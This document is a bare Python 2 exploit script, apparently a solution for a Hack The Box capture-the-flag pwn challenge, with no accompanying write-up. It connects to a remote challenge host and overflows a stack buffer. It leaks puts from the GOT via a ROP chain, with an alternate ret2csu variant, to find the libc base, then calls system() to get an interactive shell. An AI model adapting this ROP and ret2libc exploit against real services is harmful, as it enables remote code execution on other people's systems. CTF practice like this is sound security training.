```python
import sys
from struct import pack, unpack
import socket
import telnetlib
 
def readuntil(f, delim = ':'):
    buf = ''
    while not buf.endswith(delim):
        buf += f.read(1)
    return buf
 
def clear_banner(f):
    readuntil(f, chr(0x0a))
 
def interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
 
def leak_normal():
    pl  = "\x41"*(0x40 + 8)
    pl += pack("<Q", 0x4006d3)  # pop rdi; ret
    pl += pack("<Q", 0x601018)  # puts@got.plt
    pl += pack("<Q", 0x4004e0)  # callq puts@plt
    pl += pack("<Q", 0x400626)  # back to main
    return pl
 
def leak_ret2csu():
    pl  = "\x41"*(0x40 + 8)
    pl += pack("<Q", 0x4006ca)  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    pl += pack("<Q", 0x0)   # rbx
    pl += pack("<Q", 0xdeadbeef)    # rbp
    pl += pack("<Q", 0x601018)      # puts@got.plt
    pl += pack("<Q", 0x41414141)    # r13
    pl += pack("<Q", 0x42424242)    # r14
    pl += pack("<Q", 0x601018)      # puts@got.plt
    pl += pack("<Q", 0x4006b0)  # mov r13, rdx; mov r14, rsi; mov r15d, rdi; call *(r12, rbx, 8)
    return pl
 
s = socket.create_connection(("docker.hackthebox.eu", 49121))
f = s.makefile('rw', bufsize = 0)
 
clear_banner(f)
 
f.write(leak_normal() + chr(0x0a))
 
libc_puts = unpack("<Q", f.read(6).ljust(8, "\x00"))[0]
libc_base = libc_puts - 0x6f690
libc_system = libc_base + 0x45390
shell = libc_base + 0x18cd57
libc_fflush = libc_base + 0x6d7a0
 
print "- libc_puts: {}".format(hex(libc_puts))
print "- libc base: {}".format(hex(libc_base))
print "- libc_system: {}".format(hex(libc_system))
print "- /bin/sh: {}".format(hex(shell))
print "- libc_fflush: {}".format(hex(libc_fflush))
 
bss = pack("<Q", 0x00601050)
mad = pack("<Q", libc_base + 0x0004a0a2)    # movq %rsi, (%rdi) ; ret  ;
pop_rsi_ret = pack("<Q", libc_base + 0x000202e8)    # popq %rsi ; ret  ;
pop_rdi_ret = pack("<Q", 0x4006d3)  # popq %rdi ; ret  ;
dq = pack("<Q", 0x40063a)
 
# pwn
buf  = "\x41"*(0x40 + 8)
buf += pack("<Q", 0x4006d3)     # pop rdi; ret
buf += pack("<Q", 0x000000000040038f)
buf += pack("<Q", libc_system)  # call system
 
f.write(buf + chr(0x0a))
 
interact(s)
```
